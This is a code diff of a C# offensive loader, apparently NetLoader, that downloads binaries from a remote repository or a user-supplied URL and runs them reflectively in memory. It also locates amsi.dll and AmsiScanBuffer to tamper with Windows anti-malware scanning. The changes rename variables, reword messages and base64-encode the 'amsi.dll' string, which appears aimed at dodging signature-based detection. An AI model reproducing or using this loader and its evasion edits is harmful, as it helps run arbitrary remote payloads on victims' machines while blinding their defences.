@@ -41,29 +41,28 @@ public class TotallyNotNt
 
                 List<string> binList = GetBins();
 
-
+				Console.WriteLine("[+] Select a binary (number)>");
                 Console.WriteLine("------------------------");
                 Console.WriteLine("[0] - Exit NetLoader");
-                for (int count = 0; count < binList.Count; count++)
+                for (int goodGuyNumber = 0; goodGuyNumber < binList.Count; goodGuyNumber++)
                 {
-                    Console.WriteLine("[" + (count + 1) + "] - " + binList[count]);
+                    Console.WriteLine("[" + (goodGuyNumber + 1) + "] - " + binList[goodGuyNumber]);
 
-                    if (count == binList.Count - 1)
+                    if (goodGuyNumber == binList.Count - 1)
                     {
-                        Console.WriteLine("[" + (count + 2) + "] - Custom PATH or URL ");
+                        Console.WriteLine("[" + (goodGuyNumber + 2) + "] - Custom PATH or URL ");
                     }
                 }
                 Console.WriteLine("-----------------------");
-                Console.WriteLine("[+] Select a binary (number)>");
-
-                int selectedBin = Convert.ToInt32(Console.ReadLine());
-
-                if (selectedBin == 0)
+               
+				var rawInput = Console.ReadLine();
+          
+                if (Convert.ToInt32(rawInput) == 0)
                 {
                     System.Environment.Exit(1);
 
                 }
-                else if (selectedBin - 1 == binList.Count)
+                else if (Convert.ToInt32(rawInput) - 1 == binList.Count)
                 {
                     Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                     string binUrl = Console.ReadLine();
@@ -74,21 +73,21 @@ public class TotallyNotNt
 
 
                 }
-                else if (selectedBin - 1 > binList.Count | selectedBin - 1 < 0)
+                else if (Convert.ToInt32(rawInput) - 1 > binList.Count | Convert.ToInt32(rawInput) - 1 < 0)
                 {
-                    Console.WriteLine("[!] Not a valid selection!");
+                    Console.WriteLine("[!] Bad Input, sry!");
                 }
                 else
                 {
-                    Console.WriteLine("[+] Provide arguments for {0} >", binList[selectedBin - 1]);
+                    Console.WriteLine("[+] Provide arguments for {0} >", binList[Convert.ToInt32(rawInput) - 1]);
                     string binArgs = Console.ReadLine();
-                    invokeBinary(binList[selectedBin - 1], binArgs);
+                    invokeBinary(binList[Convert.ToInt32(rawInput) - 1], binArgs);
                 }
 
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[!] Something went wrong, not going to handle it..");
+                Console.WriteLine("[!] Damn, it failed, to bad");
                 Console.WriteLine("[!] {0}", ex.Message);
                 Console.WriteLine("[!] {0}", ex.InnerException);
             }
@@ -119,21 +118,27 @@ public class TotallyNotNt
 
         }
 
+		invokeBinary(binarySource,arguments);
 
-
-        System.Reflection.Assembly.Load(binarySource).EntryPoint.Invoke(0, new object[] { new string[] { arguments } });
-
+     
     }
+	
+	 public static void invokeBinary(byte[] loadMe, string arguments)
+    {	  
+		   var barFoo = new object[] { new string[] { arguments } };
+		   var fooBar = System.Reflection.Assembly.Load(loadMe);
+		   fooBar.EntryPoint.Invoke(0, barFoo);
+
+	}
+	
     public static List<string> GetBins()
     {
-        Console.WriteLine("[+] Fetching list of bins from " + _repURL);
+     
         var avBinaries = new List<string>() { };
         var websiteSource = webClient.DownloadString(_repURL);
-        string pattern = @"\/[A-Za-z]{0,50}\.bin";
 
-        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);
-        MatchCollection matches = rgx.Matches(websiteSource);
-        foreach (var match in matches)
+        Regex rgx = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
+        foreach (var match in rgx.Matches(websiteSource))
         {
             avBinaries.Add(match.ToString().TrimStart('/'));
         }
@@ -145,7 +150,7 @@ public class TotallyNotNt
     {
         try
         {
-				var fooBar = WinLibBase.LoadLibrary("am" + "si.dll");
+				var fooBar = WinLibBase.LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
                 IntPtr addr = WinLibBase.GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
 				
             if (BigBoy)
